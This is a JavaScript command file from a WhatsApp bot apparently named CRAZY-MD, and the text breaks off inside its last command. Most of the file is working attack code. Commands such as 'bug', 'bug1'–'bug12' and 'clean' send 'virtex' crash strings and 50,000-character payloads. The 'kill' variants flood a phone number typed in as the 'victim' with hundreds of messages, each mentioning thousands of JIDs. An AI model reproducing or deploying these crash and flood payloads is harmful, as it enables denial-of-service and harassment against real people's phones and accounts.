/**
 * Copyright (C) 2024 CrazyPrince
 *
 * Licensed under the GNU General Public License v3.0 (GPL-3.0)
 * You may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     (https://whatsapp.com/channel/0029VaV3DymGE56jsC8j1M3c)
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * @project       CRAZY-MD
 * @author        CrazyPrince <https://github.com/CrazyPrince>
 * @description   CrazyMd, a simple multi-functional WhatsApp bot.
 * @version       0.0.1
 * @license       GPL-3.0
 * @link          (https://github.com/CrazyPrince/CRAZY-MD)
 */
const axios = require('axios')
const pino = require("pino");
const { sck1, tiny, fancytext, cmd } = require('../lib/')
const fs = require('fs-extra');
const { exec } = require('child_process')
const crypto = require('crypto')




// Définir les valeurs de configuration directement dans le fichier
const LENGTH = 5; // Nombre de fois que le texte est dupliqué
const FORCE = 3;  // Nombre de fois que le message est envoyé
const predefinedText = `Les débats sur la validité et l'interprétation à donner à ces nombres apparaît dès les premiers siècles du christianisme. Par exemple, dans la seconde moitié du iie siècle apr. J.-C., le millénariste Irénée de Lyon, qui professe une autorité absolue des Écritures, évoque le chiffre de la bête à plusieurs reprises dans son traité Contre les hérésies : il défend « 666 » — tout en lui donnant plusieurs interprétations possibles qu'il se garde de tranche et rejette les alternatives, tentant de disqualifier leurs défenseurs qu'il traite d'ignorants.
Le court traité De Monogramma Christi, s'adressant à un public latin et attribué à Jérôme de Stridon  mais dont il n'est probablement pas l'auteur, récuse les interprétations isopséphiques et calcule un monogramme du Christ qui n'est attesté nulle part ailleurs. Il y expose également que  six cent seize  616, écrit χιϛ serait le nom usurpé par l'Antéchrist[25] du verset 18 dans le chapitre 13 de l'Apocalypse. En outre, le traité développe une argumentation qui réfute la validité de toute isopséphie réduite, arguant que le secret abrité par le chiffre devrait y rester, témoignant ainsi que l'approche isopséphique était déjà en débat chez les premiers auteurs chrétiens`;
/*
cmd({
        pattern: "bug",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            let fancyPart = fancytext(predefinedText, 6);  // Utiliser directement predefinedText
            let txt = `💣CRAZY-MD💣=> ${fancyPart} end.`;
            
            // Répéter le texte selon LENGTH
            let fullText = txt.repeat(LENGTH);

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE; i++) {
                await Void.sendMessage(citel.chat, { text: fullText }, { quoted: citel });
            }
        } catch (error) {
            console.error("Error sending Bugtext message: ", error);
        }
    }
);
*/
cmd({
        pattern: "bug",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
                const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp` + "ꦾ".repeat(50000);
                await Void.sendMessage(citel.chat, { text: bug2 }, { quoted: citel });
        } catch (error) {
            console.error("Error sending Bugtext message: ", error);
        }
    }
);

//==========================================CLEAN===============================================

// Définir les valeurs de configuration directement dans le fichier
const LENGTH1 = 3; // Nombre de fois que le texte est dupliqué
const FORCE1 = 3;  // Nombre de fois que le message est envoyé
let prefix = '໒ཞศƶƴ_♇ཞརས໒ཛ👑===>>💣💣💣777';
const {crazyvirtex1} = require('../lib/virtex/crazyvirtex1');

cmd({
        pattern: "clean",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "🛡️",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            
            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE1; i++) {
                await Void.sendMessage(citel.chat, { text: crazyvirtex1},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);

///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
cmd({
    pattern: "kill",
    alias: ["pm-kill"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (Void, citel, text,{ isCreator }) => {
    try {
        if (!isCreator) {
            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
        
        if (!text) {
            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
        }

        const jid = citel.chat; // JID of the recipient
        const bom = "ꦾ";
        const userId = Void.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';
        console.log(`jid: ${jid}`);
        console.log(`ying jid: ${ying}`);
        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await Void.sendMessage(ying, {
                    text: message,
                    mentions: Array(4000).fill(bom) // Mention the same JID 4000 times
                });
        console.log(`bom: ${bom}`);
                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await Void.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await Void.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
        citel.reply(`An error occurred: ${error.message}`);
    }
});

///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////

/*
cmd({
    pattern: "kill",
    alias: ["pm-kill"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (Void, citel, text, { isCreator }) => {
    try {
        if (!isCreator) {
            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
        
        if (!text) {
            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx|5`);
        }

        const [victim, duration] = text.split('|');
        const jid = citel.chat; // JID of the recipient
        const userId = Void.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalDuration = parseInt(duration) * 300; // Convert duration in minutes to seconds
        const endTime = Date.now() + (totalDuration * 1000); // Calculate end time

        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';
        citel.reply(`${totalDuration} seconds bugs to the victims ${victim}`);
        // Generate unique JIDs for mentions
        const uniqueJIDs = Array.from({ length: 4000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);

        while (Date.now() < endTime) {
            await Void.sendMessage(ying, {
                text: message,
                mentions: uniqueJIDs // Mention unique JIDs
            });
        }

        // Final message after all sends
        await Void.sendMessage(userId, {
            text: `All messages have been sent to ${jid} for ${duration} minutes.`
        });
    } catch (error) {
        citel.reply(`An error occurred: ${error.message}`);
    }
});
*/
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
/*
cmd({
    pattern: "kill",
    alias: ["pm-kill"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (Void, citel, text, { isCreator }) => {
    try {
        if (!isCreator) {
            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
        
        if (!text) {
            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx|5`);
        }

        const [victim, duration] = text.split('|');
        const jid = citel.chat; // JID of the recipient
        const userId = Void.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalDuration = parseInt(duration) * 300; // Convert duration in minutes to seconds
        const endTime = Date.now() + (totalDuration * 1000); // Calculate end time

        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }

        let ying = victim + '@s.whatsapp
        .net';
        citel.reply(`{totalDuration} seconds bugs to 
            the victims {victim}`;
        // Generate unique JIDs for mentions
        const uniqueJIDs = Array.from({ length: 5000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);

        while (Date.now() < endTime) {
            await Void.sendMessage(ying, {
                text: message,
                mentions: uniqueJIDs // Mention unique JIDs
            });
        }

        // Final message after all sends
        await Void.sendMessage(userId, {
            text: `All messages have been sent to ${jid} for ${duration} minutes.`
        });
    } catch (error) {
        citel.reply(`An error occurred: ${error.message}`);
    }
});
*/
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////

cmd({
    pattern: "kill2",
    alias: ["pm-kill2"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (Void, citel, text, { isCreator }) => {
    try {
        if (!isCreator) {
            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
        
        if (!text) {
            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
        }

        const jid = citel.chat; // JID of the recipient
        const userId = Void.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';

        // Generate unique JIDs for mentions
        const uniqueJIDs = Array.from({ length: 5000 }, (_, index) => `${victim}${index}@s.whatsapp.net`);

        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await Void.sendMessage(ying, {
                    text: message,
                    mentions: uniqueJIDs.slice(j * batchSends, (j + 1) * batchSends) // Mention unique JIDs
                });

                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await Void.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await Void.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
        citel.reply(`An error occurred: ${error.message}`);
    }
});
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////

cmd({
    pattern: "kill0",
    alias: ["pm-kill0"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async (Void, citel, text,{ isCreator }) => {
    try {
        if (!isCreator) {
            return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
        }
        
        if (!text) {
            return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
        }

        const jid = citel.chat; // JID of the recipient
        const userId = Void.user.id; // JID of the user
        const message = "  "; // Message to send
        const totalSends = 350; // Total number of sends
        const batchSends = 50; // Number of sends before a pause
        const pauseDuration = 2 * 60 * 1000; // Pause duration in milliseconds (2 minutes)

        let firstMessageSent = false;
        let victim = text.replace(/[^0-9]/g, "");

        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }

        let ying = victim + '@s.whatsapp.net';

        for (let i = 0; i < totalSends; i += batchSends) {
            for (let j = 0; j < batchSends; j++) {
                await Void.sendMessage(ying, {
                    text: message,
                    mentions: Array(5000).fill(jid) // Mention the same JID 4000 times
                });

                // Confirmation after sending the first message
                if (!firstMessageSent) {
                    await Void.sendMessage(userId, {
                        text: `The first message has been successfully sent to ${jid}.`
                    });
                    firstMessageSent = true;
                }
            }

            if (i + batchSends < totalSends) {
                await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} sends...` });
                await new Promise(resolve => setTimeout(resolve, pauseDuration));
            }
        }

        // Final message after all sends
        await Void.sendMessage(userId, {
            text: `All messages (total ${totalSends}) have been sent to ${jid}.`
        });
    } catch (error) {
        citel.reply(`An error occurred: ${error.message}`);
    }
});

///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
/*cmd({
    pattern: "kill",
    alias: ["htag"],
    desc: "waiting for your last words",
    category: "group",
    filename: __filename,
    use: '<text>',
},
async(Void, citel, text) => {
    if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
    if(!text) return citel.reply(`🫵🏽 add the number you want to bug after your command like this \n.kill 23769813xxxx`);
    
    const jid = citel.chat; // JID du destinataire
    const userId = Void.user.id; // JID de l'utilisateur
    const message = "  "; // Le message à envoyer
    const totalSends = 300; // Nombre total d'envois
    const batchSends = 30; // Nombre d'envois avant une pause
    const pauseDuration = 2 * 60 * 1000; // Durée de la pause en millisecondes (2 minutes)

    let firstMessageSent = false;
    
    
            let victim = text.replace(/[^0-9]/g, "");
        if (victim.startsWith('+')) {
            return citel.reply(`<!> The number starts with +. Please replace it with a number that begins with the country code\n\n<✓> Example: 23769813xxxx`);
        }
        
        let ying = victim + '@s.whatsapp.net';

    for (let i = 0; i < totalSends; i += batchSends) {
        for (let j = 0; j < batchSends; j++) {
            const sentMsg = await Void.sendMessage(ying, {
                text: message,
                mentions: Array(4000).fill(jid) // Mentionner le même JID 4000 fois
            });

            // Confirmation après l'envoi du premier message
            if (!firstMessageSent) {
                await Void.sendMessage(userId, {
                    text: `The first message has been successfully sent to ${jid}.`
                });
                firstMessageSent = true;
            }
        }

        if (i + batchSends < totalSends) {
            await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} envois...`});
            await new Promise(resolve => setTimeout(resolve, pauseDuration));
        }
    }

    // Message final après tous les envois
    await Void.sendMessage(userId, {
        text: `All messages (total ${totalSends}) Have been sent to ${jid}.`
    });
});
/*
///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
// Définir les valeurs de configuration directement dans le fichier
const LENGTH2 = 1; // Nombre de fois que le texte est dupliqué
const FORCE2 = 3;  // Nombre de fois que le message est envoyé
const {crazyvirtex2} = require('../lib/virtex/crazyvirtex2');

cmd({
        pattern: "bug1",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE2; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex2.toString()},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 3=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH3 = 1; // Nombre de fois que le texte est dupliqué
const FORCE3 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex3 = require('../lib/virtex/crazyvirtex3');

cmd({
        pattern: "bug2",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
                        // Convertir crazyvirtex3 en chaîne si ce n'est pas déjà le cas
            const messageText3 = String(crazyvirtex3);

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE3; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + messageText3.toString()},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);


///////////////////////////////////////////==========================BUG 4=====================///////////////////////////////////////////////////////
// Définir les valeurs de configuration directement dans le fichier
const LENGTH4 = 1; // Nombre de fois que le texte est dupliqué
const FORCE4 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex4 = require('../lib/virtex/crazyvirtex4');

cmd({
        pattern: "bug3",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
        

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE4; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex4},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);


///////////////////////////////////////////============================BUG 5===================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH5 = 1; // Nombre de fois que le texte est dupliqué
const FORCE5 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex5 = require('../lib/virtex/crazyvirtex5');

cmd({
        pattern: "bug4",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE5; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex5},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 6=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH6 = 1; // Nombre de fois que le texte est dupliqué
const FORCE6 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex6 = require('../lib/virtex/crazyvirtex6');

cmd({
        pattern: "bug5",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE6; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex6},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 7=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH7 = 1; // Nombre de fois que le texte est dupliqué
const FORCE7 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex7 = require('../lib/virtex/crazyvirtex7');

cmd({
        pattern: "bug6",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE7; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex7},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 8=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH8 = 1; // Nombre de fois que le texte est dupliqué
const FORC8 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex8 = require('../lib/virtex/crazyvirtex8');

cmd({
        pattern: "bug7",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE8; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex8},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////========================BUG 9=======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH9 = 1; // Nombre de fois que le texte est dupliqué
const FORCE9 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex9 = require('../lib/virtex/crazyvirtex9');

cmd({
        pattern: "bug8",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE9; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex9},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////=========================BUG 10======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH10 = 1; // Nombre de fois que le texte est dupliqué
const FORCE10 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex10 = require('../lib/virtex/crazyvirtex10');

cmd({
        pattern: "bug9",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            
            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex10},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////=========================BUG 11======================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH11 = 1; // Nombre de fois que le texte est dupliqué
const FORCE11 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex11 = require('../lib/virtex/crazyvirtex11');

cmd({
        pattern: "bug10",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE11; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex11},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 12=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH12 = 1; // Nombre de fois que le texte est dupliqué
const FORCE12 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex12 = require('../lib/virtex/crazyvirtex12');

cmd({
        pattern: "bug11",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE12; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex12},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 13=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH13 = 1; // Nombre de fois que le texte est dupliqué
const FORCE13 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex13 = require('../lib/virtex/crazyvirtex13');

cmd({
        pattern: "bug12",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
